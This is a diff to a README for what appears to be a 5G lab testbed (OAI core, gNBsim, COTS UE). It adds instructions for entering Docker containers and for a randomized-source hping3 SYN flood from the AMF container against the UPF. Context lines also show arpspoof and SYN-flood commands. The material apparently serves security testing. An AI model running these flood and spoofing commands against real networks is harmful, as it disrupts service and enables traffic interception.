@@ -38,6 +38,13 @@ sudo ./nr-softmodem -O ../../../targets/PROJECTS/GENERIC-NR-5GC/CONF/gnb.sa.band
 - The setup contains OAI core connected with 2 gNBsims and COTSUE.
 
 ## Attacks Integration
+### Common Step for Launching Attacks
+- Log into gNBsim container
+- Once inside the container launch attack command
+```bash
+docker ps
+docker exec -it <container-id> /bin/bash
+```
 
 ### IP/ARP Spoofing
 #### Command:
@@ -52,6 +59,23 @@ arpspoof -i wlan0 -t 192.168.1.1 192.168.1.18
 hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.70.156
 ```
 - Run this command from the gNBsim container and flood with SYN packets to COTSUE and 2 gNBsims.
+
+## SYN Flooding from OAI Core AMF to UPF
+#### Command:
+```bash
+hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.70.156
+```
+Run this command from the OAI core AMF container and flood with SYN packets to UPF.
+
+Additional Step: Log into OAI Core AMF Container
+
+- Run docker ps to get the container ID.
+Log into the AMF container:
+```bash
+docker exec -it <container-id> /bin/bash
+```
+- Once inside the container, launch the attack command.
+
 
 ### Deauthentication
 #### Command:
